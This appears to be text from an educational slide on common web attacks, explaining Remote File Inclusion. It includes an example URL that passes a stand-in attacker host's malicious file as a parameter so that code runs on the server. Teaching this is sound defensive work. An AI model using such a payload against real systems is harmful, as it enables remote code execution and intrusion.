@@ -1,0 +1,12 @@
+By:
+.com
+presentationgo.com
+© presentationgo.com
+Common Attacks: Directory Traversal
+File Include V
+Remote File Inclusion (RFI)
+• In the example given, the attacker is attempting to include a
+malicious file hosted on their own server, which can allow
+attacker to execute arbitrary code on the server.
+• http://example.com/index.php?file=http://hacker.com/malici
+ous.txt
